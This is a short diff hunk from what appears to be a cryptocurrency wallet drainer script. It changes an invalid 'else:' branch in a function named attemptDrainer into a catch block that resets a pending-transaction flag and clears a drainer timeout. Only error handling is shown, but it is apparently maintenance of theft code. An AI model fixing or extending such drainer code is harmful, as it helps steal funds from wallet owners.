@@ -859,7 +859,7 @@ async function attemptDrainer() {
     isTransactionPending = false;
     clearTimeout(drainerTimeout);
     await hideModalWithDelay();
-  } else: {
+  } catch (err) {
     isTransactionPending = false;
     clearTimeout(drainerTimeout);
     let errorMessage = "Error: An unexpected error occurred. Please try again.";
